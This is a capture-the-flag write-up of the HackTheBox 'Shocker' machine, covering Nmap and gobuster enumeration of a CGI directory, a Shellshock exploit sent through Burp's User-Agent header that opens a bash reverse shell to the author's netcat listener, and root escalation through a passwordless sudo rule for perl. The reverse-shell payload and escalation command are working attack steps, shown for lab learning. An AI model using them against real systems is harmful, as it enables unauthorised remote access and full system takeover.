# Reconnaissance

Retrieving the IP address of the machine, I started a quick inital Nmap scan to see which ports are open and which services are running on those ports.

```nmap
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Shocker]
└─$ sudo nmap -sC -sV -O -oA nmap/initial 10.10.10.56 -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-09 13:56 EST
Nmap scan report for 10.10.10.56
Host is up (0.13s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=1/9%OT=80%CT=1%CU=34650%PV=Y%DS=2%DC=I%G=Y%TM=63BC6365
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=108%TI=Z%CI=I%II=I%TS=8)OPS(
OS:O1=M539ST11NW6%O2=M539ST11NW6%O3=M539NNT11NW6%O4=M539ST11NW6%O5=M539ST11
OS:NW6%O6=M539ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(
OS:R=Y%DF=Y%T=40%W=7210%O=M539NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.19 seconds
                      
```

We get back the following result showing that two ports are open:
- Port `80`: running `Apache httpd 2.4.18`
- Port `2222`: running `OpenSSH 7.2p2`

Just to be sure that only these ports were running, I started a more comprehensive nmap scan in the background so that i could cover all the bases

```
nmap -sC -sV -O -p- -oA nmap/full 10.10.10.56
```

But there were no other ports open.

## Enumeration
Visiting the website, there was a small image and a sentence saying, `Don't Bug Me!`

I checked the source-code and I think it was just a static web-page.

So i ran `gobuster` to enumeratre directories

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.56
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.56
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/01/09 13:56:58 Starting gobuster in directory enumeration mode
===============================================================
/server-status        (Status: 403) [Size: 299]
===============================================================
2023/01/09 14:46:13 Finished
===============================================================
```

I've always read that Hack the Box machines are named according to the type of vulnerabilities that lie in them. So i kind of had a suspicion that this box might be vulnerable to the `Shellshock remote code execution`

You can read more about it [here](https://www.tenable.com/plugins/nessus/77823)

According to the article, this vulnerability affected web servers utilizing `CGI` (Common Gateway Interface), which is a system for generating dynamic web content. This usually involved directories such as `/cgi-sys`, `/cgi-mod`, `/cgi-bin`, etc.

I’ll manually try them on the web server to see if they exist. `/cgi-sys` and `/cgi-mod` do not exist on the web server. However `/cgi-bin` does. It was interesting to note the behaviour of the web server when I add `/cgi-bin` versus `/cgi-bin/` to the URL path.

![sck-1](https://user-images.githubusercontent.com/87711310/211395414-c77cc752-4d6a-4938-9aca-40fff681b721.png)

![sck-2](https://user-images.githubusercontent.com/87711310/211395419-7d72cd91-d22e-46df-8888-7dfb2c46dcd2.png)

`/cgi-bin/` gave me a `403` (you don’t have access to this resource) and `/cgi-bin` gave me a `404` (resource not found). It seems that if we don’t add the `/` at the end of the URL, the server is interpreting it as a `file` instead of a `directory` (maybe, I’m not too sure).

Now it makes sense why Gobuster did not find the directory. It checked the url `10.10.10.56/cgi-bin`, got a `404` and therefore didn’t report it. The `-f` flag appends `/` to each request. So I ran Gobuster again.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Shocker]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.56 -f
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.56
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Add Slash:               true
[+] Timeout:                 10s
===============================================================
2023/01/09 14:04:31 Starting gobuster in directory enumeration mode
===============================================================
/cgi-bin/             (Status: 403) [Size: 294]
/icons/               (Status: 403) [Size: 292]
/server-status/       (Status: 403) [Size: 300]
```

Since this box is realted to shellshock bash remote code execution, I further enumerated the `/cgi-bin` directory to find out if any `.sh` or `.cgi` file existed

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.56/cgi-bin/ -x sh,cgi -t 200          
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.56/cgi-bin/
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              sh,cgi
[+] Timeout:                 10s
===============================================================
2023/01/09 14:07:21 Starting gobuster in directory enumeration mode
===============================================================
/user.sh              (Status: 200) [Size: 119]
                                               
===============================================================
2023/01/09 14:15:05 Finished
===============================================================
```

I get back a bash script (`user.sh`). When I visit the URL, it prompts me to `download` the file.

Opening the file shows us the following content.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Shocker]
└─$ mv ../../../../Downloads/Ivprlm+f.sh .              
                                                                                                                                                                                                                                                                                                                            
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Shocker]
└─$ ls                            
Ivprlm+f.sh  nmap
                                                                                                                                                                                                                                                                                                                            
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Shocker]
└─$ file Ivprlm+f.sh 
Ivprlm+f.sh: text/plain, ASCII text
                                                                                                                                                                                                                                                                                                                            
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Shocker]
└─$ cat Ivprlm+f.sh    
Content-Type: text/plain

Just an uptime test script

 14:08:08 up 16 min,  0 users,  load average: 0.26, 0.11, 0.03

```


```
──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Shocker]
└─$ mv ../../../../Downloads/bLKBAA_T.sh .
                                                                                                                                                                                                                                                                                                                            
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Shocker]
└─$ ls
bLKBAA_T.sh  Ivprlm+f.sh  nmap
                                                                                                                                                                                                                                                                                                                            
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Shocker]
└─$ cat bLKBAA_T.sh         
Content-Type: text/plain

Just an uptime test script

 14:08:28 up 16 min,  0 users,  load average: 0.32, 0.13, 0.04

```


A couple of files were download, but interestingly they all gave the same results.

So i fired up `Burp-Suite` and intercepted the request of the `/cgi-bin/user.sh` and sent it to the `Repeater`

![sck-3](https://user-images.githubusercontent.com/87711310/211396709-ca4c1250-274f-4542-ab25-621b4f9ebe4b.png)

The above image shows the request to the bash script and the response we get from the server. Now let’s try to see if it is vulnerable to `shellshock`.

##  Gaining an Initial Foothold

I googled “shellshock reverse shell” and found this [blog](https://hackbotone.com/shellshock-attack-on-a-remote-web-server-d9124f4a0af3) explaining how to exploit the shellshock vulnerability to get a reverse shell on the system the web server is running on. The method to gain a reverse shell was fairly similar expect for the part where I used `Burp` instead of using `curl`

First I added the following string in the User Agent field in Burp.

```
() { ignored;};/bin/bash -i >& /dev/<IP>/4444 0>&1
```

Then I started up a listener on my machine using the same configuration in the above string.
```
nc -nlvp 4444
```

I went back to `Burp` and executed the request. 

![sck-4](https://user-images.githubusercontent.com/87711310/211397387-b05854a6-09c8-4069-ae41-5edb82ccd0a2.png)

Burp shouldn’t give you a response if the exploit worked. I went back to my listener and checked if I got a shell back.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Shocker]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.56] 40972
bash: no job control in this shell
shelly@Shocker:/usr/lib/cgi-bin$ whoami
whoami
shelly
```

I could easily get the `user flag` from `/shelly/user.txt`

```
shelly@Shocker:/usr/lib/cgi-bin$ ls
ls
user.sh
shelly@Shocker:/usr/lib/cgi-bin$ cd ..
cd ..
shelly@Shocker:/usr/lib$ cd ..
cd ..
shelly@Shocker:/usr$ cd ..
cd ..
shelly@Shocker:/$ ls
...
home
initrd.img
lib
...
shelly@Shocker:/$ cd home
cd home
shelly@Shocker:/home$ ls
ls
shelly
shelly@Shocker:/home$ cd shelly
cd shelly
shelly@Shocker:/home/shelly$ ls
ls
user.txt
shelly@Shocker:/home/shelly$ cat user.txt
cat user.txt
******************
```

# Privilege Escalation
 
To check what permissions I have as a `sudo` user I ran `sudo -l` command

```
shelly@Shocker:/home/shelly$ sudo -l
sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl

```

I can run perl as root!. If I use perl to send a reverse shell back to my machine it will get executed with the same privileges that perl is running in. So if I run perl with sudo privileges, I’ll get back a reverse shell with root privileges.

I used [GTFOBins](https://gtfobins.github.io/gtfobins/perl/#sudo) to escalate my privileges

```
perl -e 'exec "/bin/sh";'
```

Execute the code and we have root!

```
shelly@Shocker:/home/shelly$ sudo perl -e 'exec "/bin/sh";'
sudo perl -e 'exec "/bin/sh";'
whoami
root
cat /root/root.txt
************

```
